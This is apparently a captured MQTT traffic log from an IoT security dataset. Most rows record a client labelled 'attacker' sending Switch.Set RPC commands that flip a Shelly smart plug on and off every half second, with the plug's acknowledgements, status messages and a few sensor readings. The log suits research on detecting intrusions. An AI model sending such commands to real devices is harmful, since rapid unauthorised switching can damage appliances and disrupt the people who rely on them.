2026-04-22T16:19:29,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:29,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3961 33302.499 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:29,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:29,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33302.50,""swi"
2026-04-22T16:19:29,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3962 33302.517 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:30,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:30,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:30,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3963 33302.999 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:30,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:30,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33303.00,""swi"
2026-04-22T16:19:30,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3964 33303.016 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:30,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:30,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:30,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3965 33303.501 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:30,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:30,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33303.50,""swi"
2026-04-22T16:19:30,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3966 33303.520 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:31,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:31,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:31,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3967 33304.001 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:31,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:31,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33304.00,""swi"
2026-04-22T16:19:31,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3968 33304.017 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:31,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:31,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:31,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3969 33304.501 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:31,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:31,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33304.50,""swi"
2026-04-22T16:19:31,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3970 33304.520 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:32,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:32,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:32,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3971 33305.001 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:32,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:32,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33305.00,""swi"
2026-04-22T16:19:32,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3972 33305.018 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:32,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:32,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:32,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3973 33305.502 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:32,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:32,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33305.50,""swi"
2026-04-22T16:19:32,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3974 33305.520 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:33,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:33,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:33,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3975 33306.003 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:33,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:33,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33306.00,""swi"
2026-04-22T16:19:33,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3976 33306.019 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:33,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:33,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:33,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3977 33306.503 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:33,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:33,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33306.50,""swi"
2026-04-22T16:19:33,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3978 33306.521 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:34,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:34,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3979 33307.003 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:34,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:34,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33307.00,""swi"
2026-04-22T16:19:34,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3980 33307.020 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:34,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:19:34,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:19:34,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:34,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3981 33307.506 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:34,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:34,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33307.50,""swi"
2026-04-22T16:19:34,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3982 33307.525 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:35,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:35,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3983 33308.004 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:35,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:35,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33308.00,""swi"
2026-04-22T16:19:35,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3984 33308.021 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:35,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:35,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3985 33308.505 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:35,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:35,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33308.50,""swi"
2026-04-22T16:19:35,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3986 33308.524 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:36,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:36,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3987 33309.005 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:36,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:36,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33309.00,""swi"
2026-04-22T16:19:36,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3988 33309.022 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:19:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:19:36,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:19:36,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:19:36,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:19:36,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:36,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3989 33309.506 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:36,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:36,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33309.50,""swi"
2026-04-22T16:19:36,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3990 33309.525 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:37,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:37,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:37,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3991 33310.006 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:37,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:37,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33310.00,""swi"
2026-04-22T16:19:37,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3992 33310.023 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:37,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:37,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:37,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3993 33310.507 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:37,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:37,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33310.50,""swi"
2026-04-22T16:19:37,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3994 33310.526 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:38,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:38,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:38,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3995 33311.008 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:38,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:38,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33311.00,""swi"
2026-04-22T16:19:38,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3996 33311.024 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:38,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:38,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:38,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3997 33311.508 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:38,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:38,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33311.51,""swi"
2026-04-22T16:19:38,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3998 33311.527 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:39,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:39,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:39,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3999 33312.009 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:39,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:39,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33312.01,""swi"
2026-04-22T16:19:39,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4000 33312.026 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:39,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:19:39,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:19:39,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:39,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:39,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4001 33312.510 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:39,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:39,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33312.51,""swi"
2026-04-22T16:19:39,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4002 33312.528 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:40,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:40,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:40,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4003 33313.010 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:40,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:40,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33313.01,""swi"
2026-04-22T16:19:40,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4004 33313.027 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:40,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:40,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:40,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4005 33313.510 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:40,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:40,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33313.51,""swi"
2026-04-22T16:19:40,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4006 33313.529 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:41,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:41,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:41,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4007 33314.011 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:41,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:41,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33314.01,""swi"
2026-04-22T16:19:41,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4008 33314.028 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:41,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:41,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:41,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4009 33314.511 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:41,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:41,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33314.51,""swi"
2026-04-22T16:19:41,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4010 33314.530 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:42,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:42,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:42,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4011 33315.012 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:42,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:42,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33315.01,""swi"
2026-04-22T16:19:42,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4012 33315.028 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:42,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:42,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
